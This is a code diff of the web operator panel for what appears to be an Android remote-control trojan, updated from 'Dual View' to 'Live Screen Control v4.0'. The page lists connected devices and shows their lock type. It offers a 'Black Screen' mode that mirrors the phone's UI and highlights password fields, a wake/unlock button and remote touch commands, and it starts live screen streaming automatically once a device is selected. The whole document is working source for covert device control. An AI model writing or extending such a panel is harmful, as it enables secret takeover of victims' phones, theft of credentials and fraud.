@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screen Control - Dual View</title>
+    <title>Screen Control - Live View</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
         
@@ -15,92 +15,6 @@
             padding: 0; 
             height: 100vh; 
             overflow: hidden; 
-        }
-        
-        /* Dialog Window Styles */
-        .dialog-window {
-            position: fixed;
-            background: #1e1e1e;
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
-            z-index: 10000;
-            resize: both;
-            overflow: hidden;
-            min-width: 400px;
-            min-height: 300px;
-        }
-        
-        .dialog-header {
-            background: #2a2a2a;
-            padding: 10px 15px;
-            cursor: move;
-            border-bottom: 1px solid #00ff00;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .dialog-title {
-            font-family: 'Orbitron', sans-serif;
-            font-weight: bold;
-            color: #00ff00;
-        }
-        
-        .dialog-close {
-            background: #ff4444;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 25px;
-            height: 25px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        .dialog-content {
-            height: calc(100% - 40px);
-            overflow: hidden;
-        }
-        
-        /* Screen Container Styles */
-        .screen-container {
-            position: relative;
-            background-color: #000;
-            transform-origin: top left;
-            overflow: hidden;
-        }
-        
-        .ui-screen-container {
-            background-color: #1a1a1a;
-        }
-        
-        .ui-screen-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-        
-        .screen-element {
-            position: absolute;
-            border: 1px solid rgba(0, 255, 255, 0.6);
-            background-color: rgba(0, 139, 139, 0.2);
-            box-sizing: border-box;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 2px;
-        }
-        
-        .element-text {
-            color: white;
-            font-size: 12px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            max-width: 100%;
         }
         
         /* Main Views */
@@ -276,12 +190,76 @@
             position: relative;
         }
         
-        #screen-viewport { 
+        .screen-viewport {
             border: 8px solid #444; 
             border-radius: 20px; 
             background-color: #000; 
             box-shadow: 0 0 20px rgba(0,0,0,0.5); 
             overflow: hidden; 
+            position: relative;
+        }
+        
+        .screen-container {
+            position: relative;
+            background-color: #000;
+            transform-origin: top left;
+            overflow: hidden;
+        }
+        
+        .screen-element {
+            position: absolute;
+            border: 1px solid rgba(0, 255, 255, 0.6);
+            background-color: rgba(0, 139, 139, 0.2);
+            box-sizing: border-box;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 2px;
+        }
+        
+        .element-text {
+            color: white;
+            font-size: 12px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 100%;
+        }
+        
+        /* Live Screen Image */
+        .live-screen-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background-color: #000;
+        }
+        
+        /* Clickable Overlay */
+        .clickable-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1000;
+        }
+        
+        .clickable-element {
+            position: absolute;
+            cursor: pointer;
+            border: 2px dashed rgba(0, 255, 0, 0.5);
+            background-color: rgba(0, 255, 0, 0.1);
+            transition: all 0.2s;
+            box-sizing: border-box;
+            pointer-events: all;
+        }
+        
+        .clickable-element:hover {
+            background-color: rgba(0, 255, 0, 0.3);
+            border: 2px solid rgba(0, 255, 0, 0.8);
         }
         
         .all-controls { 
@@ -348,79 +326,30 @@
             transform: translateY(1px);
         }
         
-        /* Keyboard Buttons */
-        .keyboard-buttons { 
-            position: absolute; 
-            bottom: 20px; 
-            left: 50%; 
-            transform: translateX(-50%); 
-            background: rgba(0,0,0,0.9); 
-            padding: 15px; 
-            border-radius: 15px; 
-            border: 2px solid #00ff00;
-            display: none; 
-            z-index: 1000;
+        /* Status Indicator */
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.9em;
         }
         
-        .key-row { 
-            display: flex; 
-            justify-content: center; 
-            margin: 5px 0; 
+        .live-indicator {
+            width: 10px;
+            height: 10px;
+            background-color: #ff4444;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
         }
         
-        .key-btn { 
-            width: 45px; 
-            height: 45px; 
-            margin: 3px; 
-            background: #333; 
-            border: 1px solid #555; 
-            color: white; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-size: 1.1em; 
+        .live-indicator.active {
+            background-color: #44ff44;
         }
         
-        .key-btn:hover { 
-            background: #444; 
-        }
-        
-        .key-btn.special { 
-            background: #0066cc; 
-        }
-        
-        .key-btn.enter { 
-            background: #00aa00; 
-        }
-        
-        /* UI Screen Clickable Overlay */
-        .ui-clickable-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1000;
-        }
-        
-        .ui-clickable-element {
-            position: absolute;
-            cursor: pointer;
-            border: 2px dashed rgba(0, 255, 0, 0.5);
-            background-color: rgba(0, 255, 0, 0.1);
-            transition: all 0.2s;
-            box-sizing: border-box;
-            pointer-events: all;
-        }
-        
-        .ui-clickable-element:hover {
-            background-color: rgba(0, 255, 0, 0.3);
-            border: 2px solid rgba(0, 255, 0, 0.8);
-        }
-        
-        /* Hidden Canvas for Screenshot */
-        #screenshot-canvas {
-            display: none;
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
@@ -428,8 +357,8 @@
 
     <div id="device-list-view" class="view active">
         <div class="header">
-            <h1>🔓 DUAL VIEW SCREEN CONTROL v3.0</h1>
-            <p style="margin: 5px 0; color: #aaa;">Black Screen + UI Screen • Dual View Mode • Real Screenshot</p>
+            <h1>🔓 LIVE SCREEN CONTROL v4.0</h1>
+            <p style="margin: 5px 0; color: #aaa;">Real-time Live Screen Streaming • Dual View Mode</p>
         </div>
         <div id="device-list-container">
             <ul id="device-list"></ul>
@@ -447,12 +376,14 @@
                 <button id="btn-black-screen" class="screen-toggle-btn active">
                     📦 Black Screen
                 </button>
-                <button id="btn-ui-screen" class="screen-toggle-btn">
-                    🖥️ UI Screen
+                <button id="btn-live-screen" class="screen-toggle-btn">
+                    📱 Live Screen
                 </button>
-                <button id="btn-refresh-ui" class="screen-toggle-btn">
-                    🔄 Refresh UI
-                </button>
+            </div>
+            
+            <div class="status-indicator">
+                <div id="live-indicator" class="live-indicator"></div>
+                <span id="stream-status">Live Stream: Off</span>
             </div>
             
             <button id="btn-wake-unlock" class="single-main-btn">
@@ -464,15 +395,12 @@
                 <!-- Black Screen View (Default) -->
                 <div id="black-screen-viewport" class="screen-viewport" style="display: block;">
                     <div id="black-screen-container" class="screen-container"></div>
-                    <div id="keyboard-buttons" class="keyboard-buttons"></div>
                 </div>
                 
-                <!-- UI Screen View (Hidden by default) -->
-                <div id="ui-screen-viewport" class="screen-viewport" style="display: none;">
-                    <div id="ui-screen-container" class="screen-container ui-screen-container">
-                        <img id="ui-screen-image" src="" alt="UI Screen" />
-                        <div id="ui-clickable-overlay" class="ui-clickable-overlay"></div>
-                    </div>
+                <!-- Live Screen View (Hidden by default) -->
+                <div id="live-screen-viewport" class="screen-viewport" style="display: none;">
+                    <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
+                    <div id="live-clickable-overlay" class="clickable-overlay"></div>
                 </div>
             </div>
             <div class="all-controls">
@@ -485,14 +413,11 @@
                 <button class="control-button" id="btn-home">⌂</button>
                 <button class="control-button" id="btn-recents">□</button>
                 <div class="divider"></div>
-                <button class="control-button" id="btn-open-black-dialog">📦</button>
-                <button class="control-button" id="btn-open-ui-dialog">🖥️</button>
+                <button class="control-button" id="btn-start-stream">▶️</button>
+                <button class="control-button" id="btn-stop-stream">⏸️</button>
             </div>
         </div>
     </div>
-
-    <!-- Hidden Canvas for Screenshots -->
-    <canvas id="screenshot-canvas"></canvas>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -501,31 +426,26 @@
         const controlView = document.getElementById('control-view');
         const deviceListEl = document.getElementById('device-list');
         const blackScreenContainer = document.getElementById('black-screen-container');
-        const uiScreenContainer = document.getElementById('ui-screen-container');
-        const uiScreenImage = document.getElementById('ui-screen-image');
-        const uiClickableOverlay = document.getElementById('ui-clickable-overlay');
+        const liveScreenImage = document.getElementById('live-screen-image');
+        const liveClickableOverlay = document.getElementById('live-clickable-overlay');
         const deviceTitleEl = document.getElementById('device-title');
         const lockStatusEl = document.getElementById('lock-status');
         const backToListBtn = document.getElementById('back-to-list-btn');
         const wakeUnlockBtn = document.getElementById('btn-wake-unlock');
-        const keyboardButtons = document.getElementById('keyboard-buttons');
         const btnBlackScreen = document.getElementById('btn-black-screen');
-        const btnUiScreen = document.getElementById('btn-ui-screen');
-        const btnRefreshUi = document.getElementById('btn-refresh-ui');
-        const btnOpenBlackDialog = document.getElementById('btn-open-black-dialog');
-        const btnOpenUiDialog = document.getElementById('btn-open-ui-dialog');
-        const screenshotCanvas = document.getElementById('screenshot-canvas');
-        const ctx = screenshotCanvas.getContext('2d');
+        const btnLiveScreen = document.getElementById('btn-live-screen');
+        const btnStartStream = document.getElementById('btn-start-stream');
+        const btnStopStream = document.getElementById('btn-stop-stream');
+        const liveIndicator = document.getElementById('live-indicator');
+        const streamStatus = document.getElementById('stream-status');
 
         let devices = {};
         let activeDeviceId = null;
-        let currentKeyboardElement = null;
-        let currentScreenView = 'black'; // 'black' or 'ui'
-        let blackScreenDialog = null;
-        let uiScreenDialog = null;
+        let currentScreenView = 'black'; // 'black' or 'live'
+        let isLiveStreaming = false;
         let lastScreenData = null;
-        let lastUiScreenshot = null;
-        let dialogZIndex = 10000;
+        let lastLiveImage = null;
+        let screenScale = 1;
 
         function showView(viewId) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
@@ -544,6 +464,7 @@
             if (el) el.remove();
             delete devices[deviceId];
             if (activeDeviceId === deviceId) {
+                stopLiveStream();
                 showView('device-list-view');
                 activeDeviceId = null;
             }
@@ -579,12 +500,15 @@
             
             li.addEventListener('click', () => {
                 activeDeviceId = device.deviceId;
-                deviceTitleEl.textContent = `${device.deviceName} - Dual View Control`;
+                deviceTitleEl.textContent = `${device.deviceName} - Live Control`;
                 lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
                 blackScreenContainer.innerHTML = '📡 Receiving screen data...';
-                uiScreenImage.src = '';
-                uiClickableOverlay.innerHTML = '';
+                liveScreenImage.src = '';
+                liveClickableOverlay.innerHTML = '';
                 showView('control-view');
+                
+                // Start live stream automatically
+                startLiveStream();
             });
             deviceListEl.appendChild(li);
         }
@@ -594,38 +518,57 @@
             
             // Update button states
             btnBlackScreen.classList.toggle('active', viewType === 'black');
-            btnUiScreen.classList.toggle('active', viewType === 'ui');
+            btnLiveScreen.classList.toggle('active', viewType === 'live');
             
             // Show/hide screen containers
             if (viewType === 'black') {
                 document.getElementById('black-screen-viewport').style.display = 'block';
-                document.getElementById('ui-screen-viewport').style.display = 'none';
+                document.getElementById('live-screen-viewport').style.display = 'none';
             } else {
                 document.getElementById('black-screen-viewport').style.display = 'none';
-                document.getElementById('ui-screen-viewport').style.display = 'block';
+                document.getElementById('live-screen-viewport').style.display = 'block';
                 
-                // If we have a UI screenshot, show it
-                if (lastUiScreenshot) {
-                    uiScreenImage.src = 'data:image/jpeg;base64,' + lastUiScreenshot;
-                } else if (lastScreenData) {
-                    // Request fresh UI screenshot
-                    requestUiScreenshot();
+                // If we have a live image, show it
+                if (lastLiveImage) {
+                    liveScreenImage.src = 'data:image/jpeg;base64,' + lastLiveImage;
                 }
             }
         }
 
-        function requestUiScreenshot() {
-            if (!activeDeviceId) return;
+        function startLiveStream() {
+            if (!activeDeviceId || isLiveStreaming) return;
             
             socket.emit('command_to_device', {
                 deviceId: activeDeviceId,
-                action: 'request_ui_screenshot',
+                action: 'start_live_stream',
                 payload: {}
             });
             
-            // Show loading
-            uiScreenImage.src = '';
-            uiScreenContainer.innerHTML = '<div style="color:white;font-size:20px;text-align:center;padding:50px;">🔄 Taking screenshot...</div>';
+            isLiveStreaming = true;
+            liveIndicator.classList.add('active');
+            streamStatus.textContent = 'Live Stream: On';
+            streamStatus.style.color = '#44ff44';
+            
+            // Show loading indicator
+            if (currentScreenView === 'live') {
+                liveScreenImage.src = '';
+                liveScreenImage.style.backgroundColor = '#000';
+            }
+        }
+
+        function stopLiveStream() {
+            if (!activeDeviceId || !isLiveStreaming) return;
+            
+            socket.emit('command_to_device', {
+                deviceId: activeDeviceId,
+                action: 'stop_live_stream',
+                payload: {}
+            });
+            
+            isLiveStreaming = false;
+            liveIndicator.classList.remove('active');
+            streamStatus.textContent = 'Live Stream: Off';
+            streamStatus.style.color = '#ff4444';
         }
 
         socket.on('screen_update', (data) => {
@@ -638,26 +581,23 @@
                 blackScreenContainer.innerHTML = '';
                 
                 const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
-                const viewportHeight = 600; // Fixed height for consistency
-                const scale = viewportHeight / remoteHeight;
+                const viewportHeight = 600;
+                screenScale = viewportHeight / remoteHeight;
                 
-                // Update viewport sizes
-                document.getElementById('black-screen-viewport').style.width = (remoteWidth * scale) + 'px';
-                document.getElementById('black-screen-viewport').style.height = viewportHeight + 'px';
+                // Update viewport sizes for black screen
+                const blackViewport = document.getElementById('black-screen-viewport');
+                blackViewport.style.width = (remoteWidth * screenScale) + 'px';
+                blackViewport.style.height = viewportHeight + 'px';
                 
                 blackScreenContainer.style.width = remoteWidth + 'px';
                 blackScreenContainer.style.height = remoteHeight + 'px';
-                blackScreenContainer.style.transform = `scale(${scale})`;
+                blackScreenContainer.style.transform = `scale(${screenScale})`;
                 
                 // Update lock status
                 if (data.lockType) {
                     lockStatusEl.textContent = `Lock: ${data.lockType}`;
                     lockStatusEl.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
                 }
-                
-                // Hide keyboard
-                keyboardButtons.style.display = 'none';
-                currentKeyboardElement = null;
                 
                 // Create elements for black screen view
                 data.elements.forEach(element => {
@@ -669,50 +609,28 @@
                     el.style.height = `${element.height}px`;
                     
                     // Special styling
-                    if (element.isKeyboard) {
-                        el.style.borderColor = '#ff9900';
-                        el.style.backgroundColor = 'rgba(255, 153, 0, 0.3)';
-                    }
-                    if (element.isPassword) {
-                        el.style.borderColor = '#ff3333';
-                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
+                    if (element.clickable) {
+                        el.style.borderColor = '#0099ff';
+                        el.style.backgroundColor = 'rgba(0, 153, 255, 0.3)';
                     }
                     if (element.editable) {
                         el.style.borderColor = '#33cc33';
                         el.style.backgroundColor = 'rgba(51, 204, 51, 0.2)';
                     }
-                    if (element.isNumber) {
-                        el.style.borderColor = '#9966ff';
-                        el.style.backgroundColor = 'rgba(153, 102, 255, 0.2)';
+                    if (element.password) {
+                        el.style.borderColor = '#ff3333';
+                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
                     }
                     
                     const textEl = document.createElement('div');
                     textEl.className = 'element-text';
                     
-                    if (element.contentDescription) {
-                        const desc = element.contentDescription.toLowerCase();
-                        if (desc.includes("more options")) { 
-                            textEl.textContent = '⋮'; 
-                            textEl.style.fontSize = '20px'; 
-                        }
-                        else if (desc.includes("navigate up") || desc.includes("drawer")) { 
-                            textEl.textContent = '≡'; 
-                            textEl.style.fontSize = '20px'; 
-                        }
-                        else if (desc.includes("keyboard")) {
-                            textEl.textContent = '⌨️'; 
-                            textEl.style.fontSize = '16px';
-                        }
-                        else if (element.text) {
-                            textEl.textContent = element.text;
-                        } else {
-                            textEl.textContent = element.contentDescription;
-                        }
-                    } else if (element.text) {
+                    if (element.text) {
                         textEl.textContent = element.text;
+                    } else if (element.contentDescription) {
+                        textEl.textContent = element.contentDescription;
                     } else if (element.className) {
-                        const shortName = element.className.split('.').pop();
-                        textEl.textContent = shortName.length > 10 ? shortName.substring(0, 8) + '..' : shortName;
+                        textEl.textContent = element.className.split('.').pop();
                     }
                     
                     el.appendChild(textEl);
@@ -727,62 +645,61 @@
                             action: 'touch_command', 
                             payload: { x: tapX, y: tapY } 
                         });
-                        
-                        // Show keyboard for editable elements
-                        if (element.editable || element.isKeyboard || element.isNumber) {
-                            currentKeyboardElement = element;
-                            showVirtualKeyboard(element);
-                        }
                     });
                     
                     blackScreenContainer.appendChild(el);
                 });
+                
+                // Update live screen viewport size
+                const liveViewport = document.getElementById('live-screen-viewport');
+                liveViewport.style.width = (remoteWidth * screenScale) + 'px';
+                liveViewport.style.height = viewportHeight + 'px';
             });
         });
 
-        socket.on('ui_screenshot', (data) => {
+        socket.on('live_screen', (data) => {
             if (data.deviceId !== activeDeviceId) return;
             
-            lastUiScreenshot = data.screenshot;
+            lastLiveImage = data.liveImage;
             
-            if (currentScreenView === 'ui') {
-                // Show real screenshot
-                uiScreenImage.src = 'data:image/jpeg;base64,' + data.screenshot;
+            if (currentScreenView === 'live') {
+                // Update live screen image
+                liveScreenImage.src = 'data:image/jpeg;base64,' + data.liveImage;
                 
-                // Add clickable overlay
-                addClickableOverlay(data.elements || lastScreenData?.elements || []);
+                // Add clickable overlay based on last screen data
+                if (lastScreenData && lastScreenData.elements) {
+                    addClickableOverlay(lastScreenData.elements);
+                }
             }
         });
 
         function addClickableOverlay(elements) {
             // Clear existing overlay
-            uiClickableOverlay.innerHTML = '';
+            liveClickableOverlay.innerHTML = '';
             
-            const remoteWidth = lastScreenData?.screenWidth || 1080;
-            const remoteHeight = lastScreenData?.screenHeight || 1920;
-            const viewportHeight = 600;
-            const scale = viewportHeight / remoteHeight;
+            if (!elements || !lastScreenData) return;
             
-            // Create clickable elements overlay for UI SCREEN
+            const remoteWidth = lastScreenData.screenWidth;
+            const remoteHeight = lastScreenData.screenHeight;
+            
+            // Create clickable elements overlay for LIVE SCREEN
             elements.forEach(element => {
-                if (element.clickable || element.editable || element.isPassword || 
-                    (element.text && element.text.toString().trim().length > 0)) {
-                    
+                if (element.clickable || element.editable || element.password) {
                     const clickableEl = document.createElement('div');
-                    clickableEl.className = 'ui-clickable-element';
+                    clickableEl.className = 'clickable-element';
                     
                     // Calculate scaled position and size
-                    const scaledX = element.x * scale;
-                    const scaledY = element.y * scale;
-                    const scaledWidth = element.width * scale;
-                    const scaledHeight = element.height * scale;
+                    const scaledX = element.x * screenScale;
+                    const scaledY = element.y * screenScale;
+                    const scaledWidth = element.width * screenScale;
+                    const scaledHeight = element.height * screenScale;
                     
                     clickableEl.style.left = `${scaledX}px`;
                     clickableEl.style.top = `${scaledY}px`;
                     clickableEl.style.width = `${scaledWidth}px`;
                     clickableEl.style.height = `${scaledHeight}px`;
                     
-                    // Click event for UI SCREEN
+                    // Click event for LIVE SCREEN
                     clickableEl.addEventListener('click', (e) => {
                         e.stopPropagation();
                         
@@ -803,187 +720,24 @@
                         }, 200);
                     });
                     
-                    uiClickableOverlay.appendChild(clickableEl);
-                }
-            });
-        }
-
-        function showVirtualKeyboard(element) {
-            keyboardButtons.innerHTML = '';
-            keyboardButtons.style.display = 'block';
-            
-            const keyboardLayout = [
-                ['1','2','3','4','5','6','7','8','9','0'],
-                ['q','w','e','r','t','y','u','i','o','p'],
-                ['a','s','d','f','g','h','j','k','l'],
-                ['z','x','c','v','b','n','m','⌫'],
-                ['space','enter']
-            ];
-            
-            keyboardLayout.forEach(row => {
-                const rowDiv = document.createElement('div');
-                rowDiv.className = 'key-row';
-                
-                row.forEach(key => {
-                    const keyBtn = document.createElement('button');
-                    keyBtn.className = 'key-btn';
-                    keyBtn.textContent = key;
-                    
-                    if (key === '⌫') keyBtn.classList.add('special');
-                    if (key === 'enter') keyBtn.classList.add('enter');
-                    
-                    keyBtn.onclick = () => {
-                        const tapX = Math.round(element.x + element.width/2);
-                        const tapY = Math.round(element.y + element.height/2);
-                        
-                        socket.emit('command_to_device', { 
-                            deviceId: activeDeviceId, 
-                            action: 'touch_command', 
-                            payload: { x: tapX, y: tapY } 
-                        });
-                    };
-                    
-                    rowDiv.appendChild(keyBtn);
-                });
-                
-                keyboardButtons.appendChild(rowDiv);
-            });
-        }
-
-        // Dialog Window Functions
-        function createDialog(title, contentHtml, width, height) {
-            const dialogId = 'dialog-' + Date.now();
-            dialogZIndex++;
-            
-            const dialog = document.createElement('div');
-            dialog.className = 'dialog-window';
-            dialog.id = dialogId;
-            dialog.style.width = width + 'px';
-            dialog.style.height = height + 'px';
-            dialog.style.left = '50px';
-            dialog.style.top = '50px';
-            dialog.style.zIndex = dialogZIndex;
-            
-            dialog.innerHTML = `
-                <div class="dialog-header">
-                    <span class="dialog-title">${title}</span>
-                    <button class="dialog-close" onclick="document.getElementById('${dialogId}').remove()">×</button>
-                </div>
-                <div class="dialog-content">${contentHtml}</div>
-            `;
-            
-            document.body.appendChild(dialog);
-            makeDraggable(dialogId);
-            return dialog;
-        }
-
-        function makeDraggable(dialogId) {
-            const dialog = document.getElementById(dialogId);
-            const header = dialog.querySelector('.dialog-header');
-            
-            let offsetX = 0, offsetY = 0, isDragging = false;
-            
-            header.addEventListener('mousedown', startDrag);
-            document.addEventListener('mousemove', drag);
-            document.addEventListener('mouseup', stopDrag);
-            
-            function startDrag(e) {
-                isDragging = true;
-                offsetX = e.clientX - dialog.offsetLeft;
-                offsetY = e.clientY - dialog.offsetTop;
-                dialog.style.cursor = 'move';
-                dialogZIndex++;
-                dialog.style.zIndex = dialogZIndex;
-            }
-            
-            function drag(e) {
-                if (!isDragging) return;
-                dialog.style.left = (e.clientX - offsetX) + 'px';
-                dialog.style.top = (e.clientY - offsetY) + 'px';
-            }
-            
-            function stopDrag() {
-                isDragging = false;
-                dialog.style.cursor = 'default';
-            }
-        }
-
-        function openBlackScreenDialog() {
-            if (!activeDeviceId || !lastScreenData) return;
-            
-            const content = `
-                <div style="width:100%;height:100%;position:relative;background:#000;">
-                    <div id="dialog-black-screen" style="width:${lastScreenData.screenWidth}px;height:${lastScreenData.screenHeight}px;transform-origin:top left;transform:scale(0.5);">
-                        ${blackScreenContainer.innerHTML}
-                    </div>
-                </div>
-            `;
-            
-            blackScreenDialog = createDialog('Black Screen View', content, 800, 600);
-        }
-
-        function openUIScreenDialog() {
-            if (!activeDeviceId || !lastUiScreenshot) return;
-            
-            const content = `
-                <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#1a1a1a;position:relative;">
-                    <img src="data:image/jpeg;base64,${lastUiScreenshot}" style="max-width:100%;max-height:100%;object-fit:contain;" />
-                    <div id="dialog-ui-overlay" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;"></div>
-                </div>
-            `;
-            
-            uiScreenDialog = createDialog('UI Screen View', content, 800, 600);
-            
-            // Add clickable overlay to dialog
-            setTimeout(() => {
-                addClickableOverlayToDialog(lastScreenData?.elements || []);
-            }, 100);
-        }
-
-        function addClickableOverlayToDialog(elements) {
-            const dialogOverlay = document.getElementById('dialog-ui-overlay');
-            if (!dialogOverlay) return;
-            
-            dialogOverlay.innerHTML = '';
-            
-            elements.forEach(element => {
-                if (element.clickable) {
-                    const clickableEl = document.createElement('div');
-                    clickableEl.style.position = 'absolute';
-                    clickableEl.style.left = `${element.x * 0.5}px`;
-                    clickableEl.style.top = `${element.y * 0.5}px`;
-                    clickableEl.style.width = `${element.width * 0.5}px`;
-                    clickableEl.style.height = `${element.height * 0.5}px`;
-                    clickableEl.style.cursor = 'pointer';
-                    clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
-                    clickableEl.style.border = '1px dashed rgba(0, 255, 0, 0.5)';
-                    clickableEl.style.pointerEvents = 'all';
-                    clickableEl.style.boxSizing = 'border-box';
-                    
-                    clickableEl.addEventListener('click', () => {
-                        const tapX = Math.round(element.x + (element.width / 2));
-                        const tapY = Math.round(element.y + (element.height / 2));
-                        
-                        socket.emit('command_to_device', { 
-                            deviceId: activeDeviceId, 
-                            action: 'touch_command', 
-                            payload: { x: tapX, y: tapY } 
-                        });
-                    });
-                    
-                    dialogOverlay.appendChild(clickableEl);
+                    liveClickableOverlay.appendChild(clickableEl);
                 }
             });
         }
 
         // Event Listeners
         btnBlackScreen.onclick = () => switchScreenView('black');
-        btnUiScreen.onclick = () => switchScreenView('ui');
-        btnRefreshUi.onclick = requestUiScreenshot;
-        btnOpenBlackDialog.onclick = openBlackScreenDialog;
-        btnOpenUiDialog.onclick = openUIScreenDialog;
+        btnLiveScreen.onclick = () => {
+            switchScreenView('live');
+            if (!isLiveStreaming) {
+                startLiveStream();
+            }
+        };
+        btnStartStream.onclick = startLiveStream;
+        btnStopStream.onclick = stopLiveStream;
 
         backToListBtn.onclick = () => { 
+            stopLiveStream();
             activeDeviceId = null; 
             showView('device-list-view'); 
         };
@@ -1058,6 +812,13 @@
         setInterval(() => { 
             if (socket.connected) socket.emit('heartbeat', {}); 
         }, 30000);
+        
+        // Auto-start live stream when device is selected
+        setInterval(() => {
+            if (activeDeviceId && currentScreenView === 'live' && !isLiveStreaming) {
+                startLiveStream();
+            }
+        }, 1000);
     </script>
 </body>
 </html>
